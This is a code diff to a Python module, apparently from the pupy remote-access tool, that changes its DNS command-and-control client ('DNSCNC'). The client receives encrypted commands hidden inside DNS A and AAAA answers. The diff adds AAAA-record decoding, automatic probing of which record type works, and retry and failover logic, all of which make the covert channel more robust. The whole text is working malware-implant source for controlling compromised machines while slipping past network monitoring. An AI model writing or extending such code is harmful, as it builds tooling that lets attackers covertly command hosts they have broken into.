@@ -14,6 +14,7 @@ import zlib
 import logging
 import time
 import uuid
+import netaddr
 
 from threading import Thread, Lock
 import ascii85
@@ -79,7 +80,7 @@ class ProxyInfo(object):
             self.scheme.lower(), auth, self.ip, self.port)
 
 class DnsCommandsClient(Thread):
-    def __init__(self, domain, key, ns=None, qtype='A', ns_proto=socket.SOCK_DGRAM, ns_timeout=3):
+    def __init__(self, domain, key, ns=None, qtype=None, ns_proto=socket.SOCK_DGRAM, ns_timeout=3):
         try:
             import pupy
             self.pupy = pupy
@@ -91,8 +92,12 @@ class DnsCommandsClient(Thread):
 
         self.iid = os.getpid() % 65535
         self.qtype = qtype
+        self._default_qtype = qtype
 
-        if (ns or self.qtype not in ('A', 'AAAA')) and dnslib:
+        if (ns or self.qtype not in (None, 'A', 'AAAA')) and dnslib:
+            if not ns:
+                raise ValueError('NS must be specified')
+
             if not type(ns) in (list, tuple):
                 ns = ns.split(':')
                 if len(ns) == 1:
@@ -150,6 +155,13 @@ class DnsCommandsClient(Thread):
         self.domain = self.domains[self.domain_id]
         self.failed = 0
 
+        self.qtype = self._default_qtype
+
+    def bad_response(self):
+        self.failed += 1
+        if self.failed > 5:
+            self.next()
+
     def event(self, command):
         logging.debug('Event: %s', command)
         self._request(command)
@@ -171,8 +183,8 @@ class DnsCommandsClient(Thread):
             )
 
         return [
-            host for af_family, _, _, _, (host, _) in socket.getaddrinfo(
-                hostname, 80, socket.AF_INET, socket.IPPROTO_TCP
+            addr[0] for af_family, _, _, _, addr in socket.getaddrinfo(
+                hostname, 80, family, socket.IPPROTO_TCP
             ) if af_family == family
         ]
 
@@ -213,12 +225,28 @@ class DnsCommandsClient(Thread):
         result = []
 
         for record in parsed.rr:
-            if not dnslib.QTYPE[record.rclass] == self.qtype:
+            if dnslib.QTYPE[record.rtype] != self.qtype:
                 continue
 
             result.append(str(record.rdata))
 
         return result
+
+    def _aaaa_page_decoder(self, addresses, nonce, symmetric=None):
+        if symmetric is None:
+            symmetric = self.encoder.kex_completed
+
+        resp = len(addresses)*[None]
+        for address in addresses:
+            raw = netaddr.IPAddress(address).packed
+            idx, = struct.unpack_from('B', raw)
+            resp[idx] = raw[1:]
+
+        data = b''.join(resp)
+        length, = struct.unpack_from('B', data)
+        payload = data[1:1+length]
+
+        return self.encoder.decode(payload, nonce, symmetric)
 
     def _a_page_decoder(self, addresses, nonce, symmetric=None):
         if symmetric is None:
@@ -282,9 +310,39 @@ class DnsCommandsClient(Thread):
         self.nonce += payload_len
         return encoded, nonce
 
+    def _probe_record_type(self):
+        logging.debug('DNSCNC: Probing supported record type')
+
+        self.qtype = 'A'
+
+        cmd = self._request(Ack(0))
+        if not cmd:
+            self.qtype = None
+            logging.debug('DNSCNC: Probe failed')
+            return False
+
+        self.qtype = 'AAAA'
+        cmd = self._request(Ack(0))
+
+        if not cmd:
+            self.qtype = 'A'
+
+        logging.debug('DNSCNC: Selected record type: %s', self.qtype)
+        return True
+
     def _request(self, *commands):
-        with self._request_lock:
-            return self._request_unsafe(commands)
+
+        answer = None
+
+        try:
+            with self._request_lock:
+                answer = self._request_unsafe(commands)
+
+        finally:
+            if not answer:
+                self.bad_response()
+
+        return answer
 
     def _request_unsafe(self, commands):
         parcel = Parcel(*commands)
@@ -301,20 +359,30 @@ class DnsCommandsClient(Thread):
 
         try:
             addresses = self.resolve(page)
-            if len(addresses) < 2:
-                logging.warning('DNSCNC: short answer: %s', addresses)
+            if not addresses:
+                logging.info('DNSCNC: no answer')
                 return []
 
         except socket.error as e:
             logging.error('DNSCNC: Communication error: %s', e)
-            self.next()
             return []
 
         response = None
 
         for attempt in xrange(2):
             try:
-                payload = self._a_page_decoder(addresses, nonce)
+                decoder = None
+
+                if self.qtype == 'A':
+                    decoder = self._a_page_decoder
+                elif self.qtype == 'AAAA':
+                    decoder = self._aaaa_page_decoder
+                else:
+                    raise NotImplementedError(
+                        'Unknown type: {}'.format(self.qtype))
+
+                payload = decoder(addresses, nonce)
+
                 if not payload:
                     logging.error('DNSCNC: No data: %s -> %s', addresses, payload)
                     self.spi = None
@@ -343,11 +411,6 @@ class DnsCommandsClient(Thread):
 
         if response:
             return list(response.commands)
-
-        self.failed += 1
-
-        if self.failed > 5:
-            self.next()
 
         return []
 
@@ -550,7 +613,14 @@ class DnsCommandsClient(Thread):
     def run(self):
         while True:
             try:
-                self.process()
+                if self.qtype is None:
+                    self._probe_record_type()
+
+                if self.qtype is not None:
+                    self.process()
+                else:
+                    logging.warning('Server not found')
+
             except Exception as e:
                 logging.exception(e)
 
